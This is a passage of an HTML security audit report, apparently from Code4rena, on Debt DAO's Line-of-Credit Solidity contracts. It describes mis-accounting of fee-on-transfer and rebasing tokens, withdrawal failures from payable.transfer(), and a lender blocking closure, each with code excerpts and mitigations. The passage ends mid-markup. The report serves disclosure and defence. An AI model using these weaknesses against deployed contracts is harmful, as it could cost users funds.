href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L487-L493\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L487-L493</a></p>\n<h3 id=\"impact-10\" style=\"position:relative;\"><a href=\"#impact-10\" aria-label=\"impact 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Some ERC20 may be tricky for the balance. Such as:</p>\n<ul>\n<li>fee on transfer (STA, USDT also has this mode)</li>\n<li>rebasing (aToken from AAVE)</li>\n<li>variable balance (stETH, balance could go up and down)</li>\n</ul>\n<p>For these tokens, the balance can change over time, even without <code>transfer()/transferFrom()</code>. But current accounting stores the spot balance of the asset.</p>\n<p>The impacts include:</p>\n<ul>\n<li>the calculation of collateral value could be inaccurate</li>\n<li>protocol could lose funds due to the deposit/repay amount being less than the actual transferred amount after fee</li>\n<li>\n<p>the amount user withdraw collateral when <code>_close()</code> will be inaccurate</p>\n<ul>\n<li>some users could lose funds due to under value</li>\n<li>some funds could be locked due to the balance inflation</li>\n<li>some funds might be locked due to the balance deflation</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"proof-of-concept-14\" style=\"position:relative;\"><a href=\"#proof-of-concept-14\" aria-label=\"proof of concept 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The spot new deposit amount is stored in the mapping <code>self.deposited[token].amount</code> and <code>credit.deposit</code>, and later used to calculate the collateral value and withdraw amount.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Line-of-Credit/contracts/utils/EscrowLib.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">addCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">EscrowState</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">self</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">oracle</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">LineLib</span><span class=\"mtk1\">.</span><span class=\"mtk11\">receiveTokenOrETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">self</span><span class=\"mtk1\">.</span><span class=\"mtk12\">deposited</span><span class=\"mtk1\">[</span><span class=\"mtk12\">token</span><span class=\"mtk1\">].</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_getCollateralValue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">EscrowState</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">self</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">oracle</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">d</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">self</span><span class=\"mtk1\">.</span><span class=\"mtk12\">deposited</span><span class=\"mtk1\">[</span><span class=\"mtk12\">token</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">collateralValue</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">CreditLib</span><span class=\"mtk1\">.</span><span class=\"mtk11\">calculateValue</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                  </span><span class=\"mtk12\">o</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getLatestAnswer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">d</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                  </span><span class=\"mtk12\">deposit</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                  </span><span class=\"mtk12\">d</span><span class=\"mtk1\">.</span><span class=\"mtk12\">assetDecimals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Line-of-Credit/contracts/modules/credit/LineOfCredit.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">increaseCredit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Credit</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">credit</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">credits</span><span class=\"mtk1\">[</span><span class=\"mtk12\">id</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">credit</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_accrue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">, </span><span class=\"mtk12\">id</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">deposit</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">credits</span><span class=\"mtk1\">[</span><span class=\"mtk12\">id</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">LineLib</span><span class=\"mtk1\">.</span><span class=\"mtk11\">receiveTokenOrETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_close</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Credit</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">deposit</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">interestRepaid</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">LineLib</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sendOutTokenOrETH</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">deposit</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">interestRepaid</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span></code></pre>\n<p>However, if the balance changed later, the returned collateral value will be inaccurate. And the amount used when withdraw collateral in <code>_close()</code> is also wrong.</p>\n<h3 id=\"recommended-mitigation-steps-13\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-13\" aria-label=\"recommended mitigation steps 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<ul>\n<li>checking the before and after balance of token transfer</li>\n<li>recording the relative shares of each user instead of specific amount</li>\n<li>if necessary, call <code>ERC20(token).balanceOf()</code> to confirm the balance</li>\n<li>disallow such kind of tokens</li>\n</ul>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/367#issuecomment-1319123709\">dmvt (judge) commented</a>:</strong></p>\n<blockquote>\n<p>This issue encompasses all ‘non-standard’ ERC20 tokens and their potential side effects within the system. Special mention for report <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/350\">#350</a>, which adds a case this report fails to capture.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/367#issuecomment-1405076131\">kibagateaux (Debt DAO) disputed</a></strong></p>\n<hr>\n<h2 id=\"m-10-addresscallvaluex-should-be-used-instead-of-payabletransfer\" style=\"position:relative;\"><a href=\"#m-10-addresscallvaluex-should-be-used-instead-of-payabletransfer\" aria-label=\"m 10 addresscallvaluex should be used instead of payabletransfer permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/369\">[M-10] <code>address.call{value:x}()</code> should be used instead of <code>payable.transfer()</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/369\">__141345__</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/529\">IllIllI</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/524\">Bnke0x0</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/506\">SmartSek</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/500\">d3e4</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/489\">pashov</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/469\">Deivitto</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/448\">bananasboys</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/443\">joestakey</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/407\">RedOneN</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/398\">cryptonue</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/389\">datapunk</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/361\">minhquanym</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/320\">Ch_301</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/319\">adriro</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/291\">cccz</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/283\">peanuts</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/255\">Tomo</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/247\">merlin</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/238\">corerouter</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/219\">RaymondFam</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/195\">codexploder</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/184\">Bnke0x0</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/178\">KingNFT</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/177\">carlitox477</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/112\">Satyam_Sharma</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/102\">Nyx</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/92\">8olidity</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/90\">cloudjunky</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/87\">0xdeadbeef0x</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/48\">martin</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/27\">rvierdiiev</a>, and <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/14\">Amithuddar</a></em></p>\n<p>When withdrawing and refund  ETH, the  contract uses Solidity’s <code>transfer()</code> function.</p>\n<p>Using Solidity’s <code>transfer()</code> function has some notable shortcomings when the withdrawer is a smart contract, which can render ETH deposits impossible to withdraw. Specifically, the withdrawal will inevitably fail when:</p>\n<ul>\n<li>The withdrawer smart contract does not implement a payable fallback function.</li>\n<li>The withdrawer smart contract implements a payable fallback function which uses more than 2300 gas units.</li>\n<li>The withdrawer smart contract implements a payable fallback function which needs less than 2300 gas units but is called through a proxy that raises the call’s gas usage above 2300.</li>\n</ul>\n<p>Risks of reentrancy stemming from the use of this function can be mitigated by tightly following the “Check-Effects-Interactions” pattern and using OpenZeppelin Contract’s ReentrancyGuard contract. </p>\n<h3 id=\"proof-of-concept-15\" style=\"position:relative;\"><a href=\"#proof-of-concept-15\" aria-label=\"proof of concept 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Line-of-Credit/contracts/utils/LineLib.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">48</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<h4 id=\"references\" style=\"position:relative;\"><a href=\"#references\" aria-label=\"references permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>References:</h4>\n<p>The issues with <code>transfer()</code> are outlined <a href=\"https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/\">here</a>.</p>\n<p>For further reference on why using Solidity’s <code>transfer()</code> is no longer recommended, refer to these <a href=\"https://blog.openzeppelin.com/reentrancy-after-istanbul/\">articles</a>.</p>\n<h3 id=\"recommended-mitigation-steps-14\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-14\" aria-label=\"recommended mitigation steps 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Using low-level <code>call.value(amount)</code> with the corresponding result check or using the OpenZeppelin <code>Address.sendValue</code> is advised, <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L60\">reference</a>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/369#issuecomment-1405078680\">kibagateaux (Debt DAO) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-11-lender-can-reject-closing-a-position\" style=\"position:relative;\"><a href=\"#m-11-lender-can-reject-closing-a-position\" aria-label=\"m 11 lender can reject closing a position permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/467\">[M-11] Lender can reject closing a position</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/467\">berndartmueller</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/390\">R2</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/352\">minhquanym</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/264\">Jeiwan</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/170\">ayeslick</a>, and <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/85\">0xdeadbeef0x</a></em></p>\n<p>A credit line can be closed by using the <code>LineOfCredit.depositAndClose()</code> or <code>LineOfCredit.close</code>. The remaining funds deposited by the lender (<code>credit.deposit</code>) and the accumulated and paid interest are transferred to the lender.</p>\n<p>However, if the used credit token <code>credit.token</code> is native ETH (or an ERC-777 token with receiver hooks, and under the assumption that the oracle supports this asset in the first place), the lender can reject the closing of the credit by reverting the token transfer.</p>\n<h3 id=\"impact-11\" style=\"position:relative;\"><a href=\"#impact-11\" aria-label=\"impact 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The lender can prevent the borrower from closing the credit line. This leads to the following consequences:</p>\n<ul>\n<li>Migrating (rollover) to a new line is not possible (it requires all credits to be closed, see <a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L55\">SecuredLine.sol#L55</a>)</li>\n<li>Releasing a spigot and transferring ownership to the borrower is not possible (see <a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L195\">SpigotedLineLib.sol#L195</a>)</li>\n<li>Sweeping remaining tokens (e.g. revenue tokens) in the Spigot to the borrower is not possible (see <a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L220%3E\">SpigotedLineLib.sol#L220</a>)</li>\n</ul>\n<h3 id=\"proof-of-concept-16\" style=\"position:relative;\"><a href=\"#proof-of-concept-16\" aria-label=\"proof of concept 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 